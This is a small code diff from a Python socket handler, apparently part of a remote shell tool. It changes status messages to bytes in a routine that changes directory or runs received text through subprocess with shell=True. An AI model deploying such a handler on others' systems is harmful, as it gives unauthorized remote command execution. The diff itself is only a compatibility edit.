@@ -99,10 +99,10 @@ def start_socket(ipaddr, base_port, shell):
                     if os.path.isdir(data):
                         print(data)
                         os.chdir(data)
-                        stdout_value = "Changed directory."
+                        stdout_value = b'Changed directory.'
 
                     else:
-                        stdout_value = "Invalid directory. Be sure to use full pathnames to change directories. Not individual directories."
+                        stdout_value = b'Invalid directory. Be sure to use full pathnames to change directories. Not individual directories.'
 
                 else:
                     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
